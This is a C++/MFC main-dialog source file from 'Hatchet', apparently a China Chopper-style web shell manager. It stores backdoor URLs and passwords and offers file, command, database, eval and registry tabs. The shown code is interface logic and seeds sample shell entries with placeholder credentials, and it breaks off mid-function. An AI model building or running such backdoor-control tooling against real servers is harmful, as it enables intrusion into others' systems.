// MainDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Hatchet.h"
#include "MainHatchet.h"
#include "MainDlg.h"
#include "SetpSiteDlg.h"

// CMainDlg 对话框
typedef struct _SiteData
{
	int	ID;
	int	nType;
	int	nCodePage;
	int	nScript;
}SiteData, * P_SiteData;

IMPLEMENT_DYNAMIC(CMainDlg, CDialog)

CMainDlg::CMainDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMainDlg::IDD, pParent)
{
}

CMainDlg::~CMainDlg()
{
}

void CMainDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TYPETREE, m_typetree);
	DDX_Control(pDX, IDC_SITELIST, m_sitelist);
	DDX_Control(pDX, IDC_EDIT_FIND, m_Edit_Find);
}


BEGIN_MESSAGE_MAP(CMainDlg, CDialog)
	ON_WM_DESTROY()
	ON_NOTIFY(NM_RCLICK, IDC_TYPETREE, OnNMRClickTypetree)
	ON_NOTIFY(NM_CLICK, IDC_TYPETREE, OnNMClickTypetree)
	ON_NOTIFY(NM_DBLCLK, IDC_TYPETREE, OnNMDblclkTypetree)
	ON_NOTIFY(NM_RCLICK, IDC_SITELIST, OnNMRClickSitelist)

	ON_COMMAND(ID_Hatchet_ADD, OnHatchetTypeAdd)
	ON_COMMAND(ID_Hatchet_EDIT, OnHatchetTypeEdit)
	ON_COMMAND(ID_Hatchet_DEL, OnHatchetTypeDel)

	ON_COMMAND(ID_MAIN_ADD, OnMainSiteAdd)			//添加站点
	ON_COMMAND(ID_MAIN_EDIT, OnMainSiteEdit)		//编辑站点
	ON_COMMAND(ID_MAIN_DELETE, OnMainSiteDelete)	//删除站点
	ON_COMMAND(ID_MAIN_FIND, OnMainSiteFind)		//查找站点
	ON_COMMAND(ID_MAIN_COPYURL, OnMainCopyUrl)		//复制站点

	ON_COMMAND(ID_MAIN2_ADD, OnMain2SiteAdd)		//添加站点
	ON_COMMAND(ID_MAIN2_FIND, OnMainSite2Find)		//查找站点

	ON_COMMAND(ID_MAIN_UPDATEINI, OnMainSiteUpdateIni)		//更新INI
	ON_COMMAND(ID_MAIN2_UPDATEINI, OnMainSite2UpdateIni)	//更新INI

	ON_COMMAND(ID_MAIN_FILE, AddFileTab)
	ON_COMMAND(ID_MAIN_CMD, AddCmdTab)
	ON_COMMAND(ID_MAIN_DATA, AddDataTab)
	ON_COMMAND(ID_MAIN_PROXY, AddProxyTab)
	ON_COMMAND(ID_MAIN_EVALCODE, AddEvalCodeTab)
	ON_COMMAND(ID_MAIN_REGISTRY, AddRegistryTab)
	ON_COMMAND(ID_MAIN_BROWSE, AddBrowseTab)

	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_SITELIST, &CMainDlg::OnNMDblclkSitelist)
	ON_NOTIFY(TVN_ENDLABELEDIT, IDC_TYPETREE, &CMainDlg::OnTvnEndlabeleditTypetree)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_SITELIST, &CMainDlg::OnLvnColumnclickSitelist)
END_MESSAGE_MAP()


// CMainDlg 消息处理程序

BOOL CMainDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	m_FontSample.CreatePointFont(80,_T("Courier New"));
	GetDlgItem(IDC_SITELIST)->SetFont(&m_FontSample);
	GetDlgItem(IDC_TYPETREE)->SetFont(&m_FontSample);
	GetDlgItem(IDC_EDIT_FIND)->SetFont(&m_FontSample);

	// TODO:  在此添加额外的初始化
	CString sPath;
	GetModuleFileName(NULL,sPath.GetBufferSetLength (MAX_PATH+1),MAX_PATH);
	sPath.ReleaseBuffer ();
	int nPos;
	nPos=sPath.ReverseFind('\\');
	sPath=sPath.Left (nPos);
	CString lpszDbFile = sPath + "\\db.mdb";
	CString lpszDbTmpFile = sPath + "\\cache.tmp";


	CFileFind  fFind;
	BOOL bSuccessDB,bSuccessDBTmp;
	bSuccessDB=fFind.FindFile(lpszDbFile);
	fFind.Close ();

	bSuccessDBTmp=fFind.FindFile(lpszDbTmpFile);
	fFind.Close ();

	pMydb = new CPData();
	//是否已有创建好的mdb文件，没有则创建它
	if(!bSuccessDB)
	{
		pMydb->Create( lpszDbFile );

		pMydb->Connect( lpszDbFile );

		CString SqlCmd = "CREATE TABLE SiteTable("
			"[ID] COUNTER PRIMARY KEY,"
			"[nType] INT DEFAULT 0 ,"			//分类
			"[nCodePage] INT DEFAULT 936 ,"		//编码
			"[SiteUrl] VARCHAR(255) NOT NULL,"	//URL
			"[JoinUrl] VARCHAR(255) ,"			//Join URL
			"[SitePass] VARCHAR(50) NOT NULL,"	//密码
			"[Config] TEXT ,"					//配置
			"[IP] VARCHAR(20) ,"				// IP
			"[nScript] INT  NOT NULL,"			// 脚本类型
			"[NewTime] DATETIME ,"				//最新时间
			"[AddTime] DATETIME "				//添加时间
			");";

		pMydb->Execute(SqlCmd);

		pMydb->Execute("INSERT INTO SiteTable (nType,nCodePage,SiteUrl,JoinUrl,SitePass,Config,IP,nScript,NewTime,AddTime) VALUES ("
			"1,65001,'http://127.0.0.1/shell.asp','','#','<T>ADO</T>\r\n<C>Provider=Microsoft.Jet.OLEDB.4.0;Data Source=D:\\test.mdb</C>','127.0.0.1','1',NOW(),'2013-10-19 00:00')");

		pMydb->Execute("INSERT INTO SiteTable (nType,nCodePage,SiteUrl,JoinUrl,SitePass,Config,IP,nScript,NewTime,AddTime) VALUES ("
			"1,65001,'http://127.0.0.1/shell.aspx','','#','<T>ADO</T>\r\n<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456</C>','127.0.0.1','2',NOW(),'2013-10-19 00:00')");

		pMydb->Execute("INSERT INTO SiteTable (nType,nCodePage,SiteUrl,JoinUrl,SitePass,Config,IP,nScript,NewTime,AddTime) VALUES ("
			"1,65001,'http://127.0.0.1/shell.php','','#','<T>MYSQL</T>\r\n<H>localhost</H>\r\n<U>root</U>\r\n<P></P>\r\n<L>utf8</L>','127.0.0.1','3',NOW(),'2013-10-19 00:00')");

		pMydb->Execute("INSERT INTO SiteTable (nType,nCodePage,SiteUrl,JoinUrl,SitePass,Config,IP,nScript,NewTime,AddTime) VALUES ("
			"1,65001,'http://127.0.0.1/shell.jsp','','#','<T>XDB</T>\r\n<X>\r\noracle.jdbc.driver.OracleDriver\r\njdbc:oracle:thin:user/password@127.0.0.1:1521/test\r\n</X>','127.0.0.1','4',NOW(),'2013-10-19 00:00')");
		
		//pMydb->Execute("ALTER TABLE SiteTable ALTER COLUMN SitePass Text");改变字段类型
		//////////////////////////////////////////////////////////////////////////
		SqlCmd = "CREATE TABLE Type("
			"[ID] INT IDENTITY (1,1) PRIMARY KEY ,"
			"[nParent] INT DEFAULT 0 ,"
			"TypeName VARCHAR(255) DEFAULT ''"
			");";
		pMydb->Execute(SqlCmd);
		//加入第一个记录，用SQL语句
		pMydb->Execute("INSERT INTO Type (nParent,TypeName) VALUES ('0','Default')");
		pMydb->Execute("INSERT INTO Type (nParent,TypeName) VALUES ('0','Default2')");
	}else{
		if ( pMydb->Connect( lpszDbFile ) == FALSE)			//数据库有问题。退出
		{
			exit(0);
		}
		//////////////////////////////////////////////////////////////////////////	兼容V1版本
		if ( pMydb->CheckFields("SELECT [JoinUrl] FROM [SiteTable]") == false )
		{
			pMydb->Execute("ALTER TABLE [SiteTable] ADD COLUMN [JoinUrl] VARCHAR(255)");
			
			pMydb->Execute("UPDATE [SiteTable] SET [JoinUrl]=''");		//修复BUG
		}
		//////////////////////////////////////////////////////////////////////////
	}
	//////////////////////////////////////////////////////////////////////////								//缓存技术
	pMydbTmp = new CPData();
	//是否已有创建好的mdb Tmp 文件，没有则创建它
	if(!bSuccessDBTmp)
	{
		pMydbTmp->Create( lpszDbTmpFile );
		pMydbTmp->Connect( lpszDbTmpFile );

		pMydbTmp->Execute(	"CREATE TABLE CACHE("
			"[ID] COUNTER PRIMARY KEY,"
			"[Item] VARCHAR(255) NOT NULL,"
			"[Dat] TEXT DEFAULT '');");
	}else{
		pMydbTmp->Connect( lpszDbTmpFile );
	}
	//////////////////////////////////////////////////////////////////////////


	m_iImageList_Type.Create(24, 24, TRUE,1, 0);
	m_iImageList_Type.Add( AfxGetApp()->LoadIcon(IDI_TYPE) );
	m_typetree.SetImageList ( &m_iImageList_Type,TVSIL_NORMAL );

	HTREEITEM m_hRoot = m_typetree.InsertItem("Type",TVI_ROOT,TVI_LAST);

	MydbArray.RemoveAll();
	pMydb->Select("SELECT [TypeName] FROM [Type]", MydbArray);
	int i=0;
	while( i < MydbArray.GetSize())	// 有没有到表结尾
	{
		m_typetree.InsertItem(MydbArray.GetAt(i), 0, 0, m_hRoot);
		m_typetree.Expand(m_hRoot,TVE_EXPAND);

		i++;
	}
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	LRESULT lstyle = m_sitelist.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE);
	lstyle |= LVS_EX_FULLROWSELECT;
	m_sitelist.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE,0,lstyle);

	m_sitelist.InsertColumn(0,"SiteUrl",LVCFMT_LEFT,250);
	m_sitelist.InsertColumn(1,"Pass",LVCFMT_LEFT,50);
	m_sitelist.InsertColumn(2,"Config",LVCFMT_LEFT,80);
	m_sitelist.InsertColumn(3,"IP",LVCFMT_LEFT,100);
	m_sitelist.InsertColumn(4,"JoinUrl",LVCFMT_LEFT,30);
	m_sitelist.InsertColumn(5,"LastTime",LVCFMT_LEFT,80);
	m_sitelist.InsertColumn(6,"AddTime",LVCFMT_LEFT,80);

	m_iImageList.Create(25, 25, ILC_COLORDDB|ILC_MASK, 10, 10);
	m_iImageList.Add( AfxGetApp()->LoadIcon(IDI_ASP) );
	m_iImageList.Add( AfxGetApp()->LoadIcon(IDI_ASPX) );
	m_iImageList.Add( AfxGetApp()->LoadIcon(IDI_PHP) );
	m_iImageList.Add( AfxGetApp()->LoadIcon(IDI_JSP) );
	m_sitelist.SetImageList(&m_iImageList, LVSIL_SMALL);

	OnMainUpdateIni(true);	//打开菜刀，加载配置。第一次不要加载ini配置
	ShowSiteList();
	OnMainUpdatePost();

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CMainDlg::OnDestroy()
{
	CDialog::OnDestroy();

	pMydb->DisConnect();			//关闭数据库
	delete pMydb;
	pMydb = NULL;

	pMydbTmp->DisConnect();			//关闭数据库
	delete pMydbTmp;
	pMydbTmp = NULL;

	for (int i=0; m_sitelist.GetItemCount() > i; i++)
	{
		SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(i);
		delete pDataInfo;
		pDataInfo =NULL;
	}
}

BOOL CMainDlg::PreTranslateMessage(MSG* pMsg)
{
	CString temp="";
	if(pMsg -> message == WM_KEYUP)
	{
		if ( GetDlgItem(IDC_EDIT_FIND) == GetFocus() )		//即时查找
		{
			GetDlgItemText(IDC_EDIT_FIND, temp);
			temp.Replace("'", "''");//注入！！！
			if ( temp == "" )
			{
				m_edit.SetWindowText( "Find keywords from the Url or Config in." );					//设置状态栏
			}else{
				ShowSiteList("", temp);
			}
		}
	}
	if(pMsg -> message == WM_KEYDOWN)
	{
		if(pMsg -> wParam == VK_INSERT)		//添加一条SHELL
		{
			OnMainSiteAdd();			//添加shell
			return TRUE;
		}
		if(pMsg -> wParam == VK_DELETE)		//删除一条SHELL
		{
			OnMainSiteDelete();		//删除SHELL
			return TRUE;
		}

		if(pMsg -> wParam == VK_ESCAPE)
		{
			if ( GetDlgItem(IDC_EDIT_FIND) == GetFocus() )//隐藏
			{
				m_Edit_Find.ShowWindow(SW_HIDE);
				SetDlgItemText(IDC_EDIT_FIND, "");
				CRect rcClient;
				GetClientRect(rcClient);
				CWnd	*pSiteList   =   GetDlgItem(IDC_SITELIST);
				if (pSiteList != NULL)
				{
					rcClient.right = rcClient.right-200;
					pSiteList->MoveWindow(rcClient);
				}
			}
			CEdit*   pedt = m_typetree.GetEditControl();
			if ( pedt->GetSafeHwnd() == ::GetFocus() )
			{
				pedt->SetWindowText("");//空的话，后面会处理删除掉
				pedt->CloseWindow();
			}
			return TRUE;
		}
		if(pMsg -> wParam == VK_RETURN)
		{
			if ( GetDlgItem(IDC_SITELIST) == GetFocus() )		//编辑SHELL
			{
				OnMainSiteEdit();
				return TRUE;
			}
			if ( GetDlgItem(IDC_EDIT_FIND) == GetFocus() )//查找
			{
				GetDlgItemText(IDC_EDIT_FIND, temp);
				temp.Replace("'", "''");//注入！！！
				ShowSiteList("", temp);
				if (temp == "")
				{
					m_Edit_Find.ShowWindow(SW_HIDE);
					SetDlgItemText(IDC_EDIT_FIND, "");
					CRect rcClient;
					GetClientRect(rcClient);
					CWnd	*pSiteList   =   GetDlgItem(IDC_SITELIST);
					if (pSiteList != NULL)
					{
						rcClient.right = rcClient.right-200;
						pSiteList->MoveWindow(rcClient);
					}
				}else{
					m_Edit_Find.BringWindowToTop();
					m_Edit_Find.SetFocus();
				}
			}
			CEdit*   pedt = m_typetree.GetEditControl();
			if ( pedt->GetSafeHwnd() == ::GetFocus() )
			{
				pedt->CloseWindow();//关闭 == 失去焦点，后面会自动处理
			}
			return TRUE;
		}
		
		if ((pMsg->wParam == 'F' || pMsg->wParam == 'f') && (GetKeyState(VK_CONTROL)&0x8000))
		{
			int bVisible = GetDlgItem(IDC_EDIT_FIND)->GetStyle() & WS_VISIBLE;

			CRect rcClient;
			GetClientRect(rcClient);
			CWnd	*pSiteList   =   GetDlgItem(IDC_SITELIST);

			if (bVisible)
			{
				if (pSiteList != NULL)
				{
					rcClient.right = rcClient.right-200;
					pSiteList->MoveWindow(rcClient);
				}
				m_Edit_Find.ShowWindow(SW_HIDE);
			}else{
				if (pSiteList != NULL)
				{
					rcClient.right = rcClient.right-200;
					rcClient.bottom = rcClient.bottom - 21;
					pSiteList->MoveWindow(rcClient);
				}
				m_Edit_Find.ShowWindow(SW_SHOW);
				m_Edit_Find.SetFocus();
			}
		}else if ((pMsg->wParam == 'C' || pMsg->wParam == 'c') && (GetKeyState(VK_CONTROL)&0x8000) && GetDlgItem(IDC_SITELIST) == GetFocus())
		{
			OnMainCopyUrl();		//复制站点
		}else if ((pMsg->wParam == 'A' || pMsg->wParam == 'a') && (GetKeyState(VK_CONTROL)&0x8000) && GetDlgItem(IDC_EDIT_FIND) == GetFocus())
		{
			((CEdit *)GetDlgItem(IDC_EDIT_FIND))->SetSel( 0, -1);			//全选
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}


void CMainDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	CRect rcClient;
	GetClientRect(rcClient);

	CRect	rcSiteList = rcClient;
	CWnd	*pSiteList   =   GetDlgItem(IDC_SITELIST);
	if (pSiteList != NULL)
	{
		rcSiteList.right = rcSiteList.right - 200;
		int bVisible = GetDlgItem(IDC_EDIT_FIND)->GetStyle() & WS_VISIBLE;		//如果看见，要留给它空间
		if (bVisible)
		{
			rcSiteList.bottom = rcSiteList.bottom - 21;
		}
		pSiteList->MoveWindow(rcSiteList);
	}

	CRect	rcTreeList = rcClient;
	CWnd	*pTreeList   =   GetDlgItem(IDC_TYPETREE);
	if (pTreeList != NULL)
	{
		rcTreeList.left = rcSiteList.right + 2;
		pTreeList->MoveWindow(rcTreeList);
	}

	CRect	rcEditFind = rcClient;
	CWnd	*pEditFind   =   GetDlgItem(IDC_EDIT_FIND);
	if (pEditFind != NULL)
	{
		rcEditFind.top = rcEditFind.bottom - 19;
		rcEditFind.right = rcSiteList.right;
		pEditFind->MoveWindow(rcEditFind);
	}

	//////////////////////////////////////////////////////////////////////////	自动改变LIST宽度
	/*
	m_sitelist.InsertColumn(0,"SiteUrl",LVCFMT_LEFT,250);
	m_sitelist.InsertColumn(1,"SitePass",LVCFMT_LEFT,50);
	m_sitelist.InsertColumn(2,"Config",LVCFMT_LEFT,80);
	m_sitelist.InsertColumn(3,"IP",LVCFMT_LEFT,100);
	m_sitelist.InsertColumn(4,"NewTime",LVCFMT_LEFT,80);
	m_sitelist.InsertColumn(5,"AddTime",LVCFMT_LEFT,80);
	*/
	if (pSiteList)
	{
		pSiteList->GetClientRect(rcClient);
		int nWidth = rcClient.Width()-50-100-20-30;//-SitePass -IP -20(留出)
		// Cconfig 最多500
		// Time 最多120
		int nUrl=0,
			nConfig=0,
			nNewTime=0,
			nAddTime=0;
		for(int i=0; i <= nWidth; i+=4)
		{
			if (nUrl < 100)
			{
				nUrl += 4;
				continue;
			}
			nUrl++;
			
			if (nConfig <= 500)
			{
				nConfig++;
			}else{
				i--;
			}


			if (nNewTime <= 120)
			{
				nNewTime++;
			}else{
				i--;
			}

			if (nAddTime <= 120)
			{
				nAddTime++;
			}else{
				i--;
			}
		}
		m_sitelist.SetColumnWidth(0, nUrl);
		m_sitelist.SetColumnWidth(2, nConfig);
		m_sitelist.SetColumnWidth(5, nNewTime);
		m_sitelist.SetColumnWidth(6, nAddTime);
	}
	//////////////////////////////////////////////////////////////////////////
}


bool CMainDlg::ShowSiteList(CString szTypeName/*分类名称*/, CString szFind/*查找关键词*/, CString szSort/*哪个列*/, CString szDesc_Asc)												//显示所有shell列表
{
	/*	排序
		SiteUrl
		SitePass
		Config
		IP
		NewTime
		AddTime
	*/
	szSort_TypeName = szTypeName;/*分类名称*/
	szSort_Find = szFind;/*查找关键词*/
	szSort_Sort = szSort;/*哪个列*/
	szSort_Desc_Asc = szDesc_Asc;//排序，记忆。

	MydbArray.RemoveAll();
	int	nCol=0;
	if (szFind != "")
	{
		nCol = pMydb->Select("SELECT [ID],[nType],[nCodePage],[SiteUrl],[JoinUrl],[SitePass],[Config],[IP],[nScript],[NewTime],[AddTime] FROM [SiteTable] where [SiteUrl] like '%"+ szFind +"%' Or [JoinUrl] like '%"+ szFind +"%' Or [Config] like '%"+ szFind +"%' order by "+ szSort +" "+ szDesc_Asc, MydbArray);
	}else{
		if (szTypeName == "")
		{
			nCol = pMydb->Select("SELECT [ID],[nType],[nCodePage],[SiteUrl],[JoinUrl],[SitePass],[Config],[IP],[nScript],[NewTime],[AddTime] FROM SiteTable order by "+ szSort +" "+ szDesc_Asc, MydbArray);
		}else{
			nCol = pMydb->Select("SELECT [ID],[nType],[nCodePage],[SiteUrl],[JoinUrl],[SitePass],[Config],[IP],[nScript],[NewTime],[AddTime] FROM SiteTable where nType=(select top 1 id from Type where TypeName='"+szTypeName+"') order by "+ szSort +" "+ szDesc_Asc, MydbArray);
		}
	}
	//////////////////////////////////////////////////////////////////////////
	for (int i=0; m_sitelist.GetItemCount() > i; i++)
	{
		SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(i);
		delete pDataInfo;
		pDataInfo =NULL;
	}
	m_sitelist.DeleteAllItems();	//清空列表
	//////////////////////////////////////////////////////////////////////////

	INT_PTR nArray = MydbArray.GetSize()/nCol;
	CString sz_edit;
	if (szTypeName == "")
	{
		sz_edit.Format("All Types(%d)", nArray);
	}else{
		sz_edit.Format("%s(%d)", szTypeName, nArray);
	}
	m_edit.SetWindowText( sz_edit );					//设置状态栏

	for(int i=0; i < nArray; i++)
	{
		int m_i=m_sitelist.GetItemCount();

		SiteData* pDataInfo = new SiteData;

		int nScript = atoi(MydbArray.GetAt((nCol * i) + 8));
		pDataInfo->ID = atoi(MydbArray.GetAt(nCol * i));
		pDataInfo->nScript = nScript;
		pDataInfo->nType = atoi(MydbArray.GetAt((nCol * i) + 1));
		pDataInfo->nCodePage = atoi(MydbArray.GetAt((nCol * i) + 2));

		CString szShowSiteListSiteUrl = MydbArray.GetAt((nCol * i) + 3);
		CString szShowSiteListJoinUrl = MydbArray.GetAt((nCol * i) + 4);

		if(nScript  == 1)
		{
			m_sitelist.InsertItem(m_i, szShowSiteListSiteUrl, 0);
		}else if (nScript  == 2)
		{
			m_sitelist.InsertItem(m_i, szShowSiteListSiteUrl, 1);
		}else if (nScript  == 3)
		{
			m_sitelist.InsertItem(m_i, szShowSiteListSiteUrl, 2);
		}else if (nScript  == 4)
		{
			m_sitelist.InsertItem(m_i, szShowSiteListSiteUrl, 3);
		}else{
			m_sitelist.InsertItem(m_i, szShowSiteListSiteUrl);
		}

		m_sitelist.SetItemText(m_i, 1, MydbArray.GetAt((nCol * i) + 5));

		m_sitelist.SetItemText(m_i, 2, MydbArray.GetAt((nCol * i) + 6));

		m_sitelist.SetItemText(m_i, 3, MydbArray.GetAt((nCol * i) + 7));

		m_sitelist.SetItemText(m_i, 4, szShowSiteListJoinUrl);

		m_sitelist.SetItemText(m_i, 5, TimeToTime( MydbArray.GetAt((nCol * i) + 9) ));

		m_sitelist.SetItemText(m_i, 6, TimeToTime( MydbArray.GetAt((nCol * i) + 10) ));

		m_sitelist.SetItemData(m_i, PtrToUlong(pDataInfo));
	}
	return true;
}


void CMainDlg::OnNMRClickSitelist(NMHDR *pNMHDR, LRESULT *pResult)						//右键所有shell列表，弹出 文件 CMD 数据库
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CMenu popMenu;
	VERIFY(popMenu.LoadMenu(IDR_MENU1));
	CPoint pt;
	GetCursorPos(&pt);
	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if(nList == -1)												//没有选择,弹出添加
	{
		CMenu *p=popMenu.GetSubMenu(5);
		ASSERT(p!=NULL);
		p->TrackPopupMenu(TPM_RIGHTBUTTON, pt.x, pt.y,this);
	}else{
		CMenu *p=popMenu.GetSubMenu(1);
		ASSERT(p!=NULL);
		p->TrackPopupMenu(TPM_RIGHTBUTTON, pt.x, pt.y,this);
	}

	*pResult = 0;
}

void CMainDlg::OnMainSiteFind()					//查找
{
	CRect rcClient;
	GetClientRect(rcClient);
	CWnd	*pSiteList   =   GetDlgItem(IDC_SITELIST);
	if (pSiteList != NULL)
	{
		rcClient.right = rcClient.right-200;
		rcClient.bottom = rcClient.bottom - 21;
		pSiteList->MoveWindow(rcClient);
	}

	m_Edit_Find.ShowWindow(SW_SHOW);
	m_Edit_Find.SetFocus();
}
void CMainDlg::OnMainSite2Find()				//查找
{
	CRect rcClient;
	GetClientRect(rcClient);
	CWnd	*pSiteList   =   GetDlgItem(IDC_SITELIST);
	if (pSiteList != NULL)
	{
		rcClient.right = rcClient.right-200;
		rcClient.bottom = rcClient.bottom - 21;
		pSiteList->MoveWindow(rcClient);
	}

	m_Edit_Find.ShowWindow(SW_SHOW);
	m_Edit_Find.SetFocus();
}


void CMainDlg::OnNMRClickTypetree(NMHDR *pNMHDR, LRESULT *pResult)				//TypeTree 弹出菜单
{
	CPoint point(GetMessagePos());
	m_typetree.ScreenToClient(&point);
	UINT uFlag;
	select_ht = m_typetree.HitTest(point,&uFlag); //返回与CtreeCtrl关联的光标的当前位置和句柄
	if (select_ht == NULL)
	{
		return;
	}
	m_typetree.SelectItem(select_ht);
	CMenu popMenu;
	VERIFY(popMenu.LoadMenu(IDR_MENU1));
	CMenu *p=popMenu.GetSubMenu(0);
	ASSERT(p!=NULL);
	CPoint pt;
	GetCursorPos(&pt);
	p->TrackPopupMenu(TPM_LEFTALIGN|TPM_LEFTBUTTON, pt.x, pt.y, this);

	*pResult = 0;
}


void CMainDlg::OnNMDblclkTypetree(NMHDR *pNMHDR, LRESULT *pResult)				//TypeTree 双击
{
	*pResult = 0;

	CPoint point(GetMessagePos());
	m_typetree.ScreenToClient(&point);
	UINT uFlag;
	HTREEITEM m_hItem = m_typetree.HitTest(point,&uFlag); //返回与CtreeCtrl关联的光标的当前位置和句柄

	if ( m_typetree.GetChildItem(m_hItem) == NULL)				//判断根
	{
		szSelect_Type = m_typetree.GetItemText(m_hItem);//添加shell默认显示类型
		//szSelect_Type.Replace("'", "''");//不能换，比较的时候不相等了
		CString temp = szSelect_Type;
		temp.Replace("'", "''");
		ShowSiteList( temp );
	}else{
		szSelect_Type = "";//添加shell默认显示类型
		m_typetree.Expand(m_hItem,TVE_COLLAPSE);
		ShowSiteList();
	}

}

void CMainDlg::OnMainCopyUrl()		//复制站点
{
	CString temp;
	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;
	temp = m_sitelist.GetItemText(nList, 0);

	int nUrlLen = temp.GetLength() - rfind(temp, "/") + 1;
	temp = temp.Left(nUrlLen);

	if( OpenClipboard() )
	{
		HGLOBAL clipbuffer;
		char * buffer;
		EmptyClipboard();
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, temp.GetLength()+1);
		buffer = (char*)GlobalLock(clipbuffer);
		strcpy_s(buffer, temp.GetLength()+1, LPCSTR(temp));
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT,clipbuffer);
		CloseClipboard();

		m_edit.SetWindowText( "Text \""+ temp +"\" have been copied" );					//设置状态栏
	}

	m_sitelist.SetFocus();
}

void CMainDlg::OnMainSiteDelete()		//删除SHELL
{
	CString temp;
	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
	temp.Format("%d", pDataInfo->ID);
	if (pDataInfo->ID < 1)
	{
		m_sitelist.SetFocus();
		m_edit.SetWindowText( "ID:"+ temp +"NotFind" );					//设置状态栏
		return;
	}
	if ( MessageBox(m_sitelist.GetItemText(nList, 0)+"\r\nDo you want to delete this url?", "ID: "+temp, MB_OKCANCEL) == IDOK)
	{
		if ( pMydb->Execute("Delete from [SiteTable] where [id]="+ temp) )
		{
			m_edit.SetWindowText( "Delete completed" );					//设置状态栏
		}else{
			m_edit.SetWindowText( "Delete fail" );					//设置状态栏
		}
		
		CString OnMainSiteDelete = szSelect_Type;
		OnMainSiteDelete.Replace("'", "''");
		ShowSiteList(OnMainSiteDelete);		//删除完成刷新
	}
	m_sitelist.SetFocus();
}
void CMainDlg::OnMainSiteAdd()			//添加shell
{
	CSetpSiteDlg * pSetpSiteDlg = new CSetpSiteDlg;
	if (pSetpSiteDlg)
	{
		CPoint pt;
		GetCursorPos(&pt);

		CRect rcClient;
		GetWindowRect(rcClient);

		int rcX = pt.x-100;
		if (rcClient.left > pt.x-100)
		{
			rcX = rcClient.left;
		}

		int rcY = pt.y-100;
		if (rcClient.top > pt.y-100)
		{
			rcY = rcClient.top;
		}

		pSetpSiteDlg->pCMainDlg = this;
		pSetpSiteDlg->szSelect_Type = szSelect_Type;//默认显示类型
		pSetpSiteDlg->nSiteID = 0;
		pSetpSiteDlg->Create(CSetpSiteDlg::IDD,this);
		pSetpSiteDlg->ShowWindow(SW_SHOW);
		pSetpSiteDlg->SetWindowPos(NULL, rcX, rcY, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
	}
}
void CMainDlg::OnMain2SiteAdd()			//添加shell
{
	CSetpSiteDlg * pSetpSiteDlg = new CSetpSiteDlg;
	if (pSetpSiteDlg)
	{
		CPoint pt;
		GetCursorPos(&pt);

		CRect rcClient;
		GetWindowRect(rcClient);

		int rcX = pt.x-100;
		if (rcClient.left > pt.x-100)
		{
			rcX = rcClient.left;
		}

		int rcY = pt.y-100;
		if (rcClient.top > pt.y-100)
		{
			rcY = rcClient.top;
		}

		pSetpSiteDlg->pCMainDlg = this;
		pSetpSiteDlg->szSelect_Type = szSelect_Type;//默认显示类型
		pSetpSiteDlg->nSiteID = 0;
		pSetpSiteDlg->Create(CSetpSiteDlg::IDD,this);
		pSetpSiteDlg->ShowWindow(SW_SHOW);
		pSetpSiteDlg->SetWindowPos(NULL, rcX, rcY, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
	}
}

void CMainDlg::OnMainSiteEdit()			//编辑shell
{
	CSetpSiteDlg * pSetpSiteDlg = new CSetpSiteDlg;
	if (pSetpSiteDlg)
	{
		int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
		if (nList < 0) return;

		SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
		CPoint pt;
		GetCursorPos(&pt);

		CRect rcClient;
		GetWindowRect(rcClient);

		int rcX = pt.x-100;
		if (rcClient.left > pt.x-100)
		{
			rcX = rcClient.left;
		}

		int rcY = pt.y-100;
		if (rcClient.top > pt.y-100)
		{
			rcY = rcClient.top;
		}

		pSetpSiteDlg->pCMainDlg = this;
		pSetpSiteDlg->szSelect_Type = szSelect_Type;//默认显示类型
		pSetpSiteDlg->nSiteID	= pDataInfo->ID;
		pSetpSiteDlg->Create(CSetpSiteDlg::IDD,this);
		pSetpSiteDlg->ShowWindow(SW_SHOW);
		pSetpSiteDlg->SetWindowPos(NULL, rcX, rcY, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
	}
}

void CMainDlg::OnNMDblclkSitelist(NMHDR *pNMHDR, LRESULT *pResult)			//双击也是 文件管理
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if(nList >= 0)
	{
		AddFileTab();
	}
	*pResult = 0;
}


void CMainDlg::AddFileTab()																				//文件管理
{
	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
	szGlobal_SiteUrl	= m_sitelist.GetItemText(nList,0);
	szGlobal_SitePass	= m_sitelist.GetItemText(nList,1);
	nGlobal_SiteCode	= pDataInfo->nCodePage;
	nGlobal_SiteScript	= pDataInfo->nScript;
	CString szUpdataIP;
	szUpdataIP.Format("%d", pDataInfo->ID);
